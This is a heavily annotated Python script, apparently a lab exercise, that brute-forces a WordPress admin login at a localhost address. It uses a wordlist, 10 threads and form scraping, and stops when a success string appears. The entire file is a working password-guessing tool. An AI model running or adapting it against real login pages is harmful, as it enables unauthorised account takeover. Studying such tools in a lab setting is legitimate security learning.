from io import BytesIO                                          # Allows to treat bytes in memory like a file. 
                                                                # Here HTML response content comes in as bytes, and lxml is given a file-like object built from those bytes.
from lxml import etree                                          # Used for parsing HTML/XML and walking through elements.
from queue import Queue                                         # Handles synchronization internally, so several threads can safely
                                                                # add items with put() and remove items with get() at the same time.

import requests                                                 # To make HTTP requests like GET and POST.
import threading                                                # Lets us create multiple threads that run concurrently. 
import time                                                     # To pause each worker thread for 5 seconds between attempts.

SUCCESS = 'Welcome to WordPress!'                               # Our code later checks whether this string appears in a response body. If it does, the code treats that as success.
TARGET = "http://localhost:8080/wp-login.php"
WORDLIST = "/home/kali/Downloads/cain-and-abel.txt" 


# Loads words from the wordlist file into a queue.
def get_words():
    with open(WORDLIST) as f:                                   # Opens our wordlist.
        raw_words = f.read()                                    # Reads the entire file into one string, 
                                                                # so raw_words now contains all file contents.
    
    words = Queue()                                             # Creates a new thread-safe queue.

    for word in raw_words.split():                              # Loops through each resulting token, 
                                                                # splitting the file text into separate words using whitespace. 
                                                                # `word` is each individual token in return. 
        words.put(word)                                         # Adds each word into the queue. put() inserts an item into a Queue.
    return words                                                # Returns the queue object, giving us a queue filled with words from the wordlist. 



# Extracts HTML form input fields into a Python dictionary.
def get_params(content):                                        # content is HTML response content in bytes.
    params = dict()                                             # Creates an empty dictionary. This will store key-value pairs extracted from HTML input elements.
    parser = etree.HTMLParser()                                 # Creates an HTML parser object from lxml. This parser is meant to parse HTML content.
    tree = etree.parse(BytesIO(content), parser=parser)         # Wraps `content` bytes in a `BytesIO` object so it behaves like a file. `tree` becomes the parsed HTML document.
    # Loops through all <input> elements in the parsed HTML:
    for elem in tree.findall('//input'):                        # Finds all input elements.
        name = elem.get('name')                                 # Reads the name attribute from the current input element: <input name="log" ...> name becomes "log".
        if name is not None:                                    # Checks that the input actually has a `name` attribute. If there is no `name`, it skips that element.
            params[name] = elem.get('value', None)              # Uses the input’s `name` as the dictionary key, and the input’s `value` attribute as the dictionary value. 
                                                                # If there is no `value`, it stores `None`. 
    return params                                               # Returns the completed dictionary. 


# Creating objects
class Bruter:
    '''
    __init__ is a constructor — this runs automatically when we create an object here: `b = Bruter('admin', TARGET)`.
    Python creates an instance of the class, and automatically calls: __init__(self, username, url).
    '''
    def __init__(self, username, url):                          # self = the object being created.                  
        self.username = username                                # Saves the passed-in `username` onto the object, so it becomes an instance attribute. If you pass `admin`, it becomes `self.username == admin`.
        self.url = url                                          # If you passed `TARGET` here: `b = Bruter('admin', TARGET)`, then: `self.url == "http://localhost:8080/wp-login.php"
        self.found = False                                      # This Object flag starts as False and becomes True once a match is found. It belongs to the object(Bruter), so all methods of the same object can access it.
        print(f'\nBrute Force Attack beginning on {url}.\n')
        print(f'\nFinished the setup where Username = {username}.\n')
        # print("Finished the setup where username = %s\n" % username) — Old string formatting. 
    
    # Creates 10 threads.
    def run_bruteforce(self, passwords):
        # Runs the loop 10 times for that purpose, creating a new thread object.
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()                                           # The thread begins executing self.web_bruter(passwords).
                                                                # run_bruteforce() starts the threads, but web web_bruter() does the actual work.
    

    # Worker method run by each thread: sends requests using passwords
    # from the shared queue(passwords) until a match is found or the queue is empty.
    def web_bruter(self, passwords):
        session = requests.Session()                            # Creates a session object to remember things(cookies;settings;reused network connections) between requests. 
        # Sends a GET request to the URL, 
        # and saves the server’s reply in resp0:
        resp0 = session.get(self.url)                           # The thread is using the same session object for both requests(GET & POST). 10 threads create 10 separate sessions.
        # Passes the raw response body (resp0.content) 
        # into get_params:
        params = get_params(resp0.content)                      # get_params() returns a dictionary of HTML input names/values. That dictionary is stored in `params`.
        params['log'] = self.username                           # Adds the 'log' key in the dictionary. So `log` is `admin` now (from `b = Bruter('admin', TARGET)`). 
                                                                # Once log is set to admin, the later loop keeps changing only the password field while the username stays the same.


        # Starts a loop.It continues while: 
        # 1. the queue is not empty; 2. success has not been found.
        while not passwords.empty() and not self.found:
            time.sleep(5)                                       # Pauses the current thread fro 5 secs.
            passwd = passwords.get()                            # Gets one item from the shared queue.
            print(f'Trying username/password {self.username}/{passwd:<10}') # Prints the username and current password candidate.
            params['pwd'] = passwd                              # Sets it to the current candidate word. 
                                                                # So now `params` includes both: 1. hard-coded username; 2. current password candidate. 

            
            # Sends a POST request to the same URL.
            # The server response is stored in `resp1`:          
            resp1 = session.post(self.url, data=params)         # data=params means the dictionary is sent as form data like a normal HTML form in a browser: encoding with 'application/x-www-form-urlencoded': log=admin&pwd=1234.           
            if SUCCESS in resp1.content.decode():
                self.found = True
                print(f"\nBruteforcing successful.")
                print(f"Username is {self.username}")
                print(f"Password is {passwd}\n")
                # print("Username is %s" % self.username) — Old formatting. 
                # print("Password is %s\n" % passwd)
                print('Done: now cleaning up other threads...')

if __name__ == '__main__':
    words = get_words()
    b = Bruter('admin', TARGET)
    b.run_bruteforce(words)
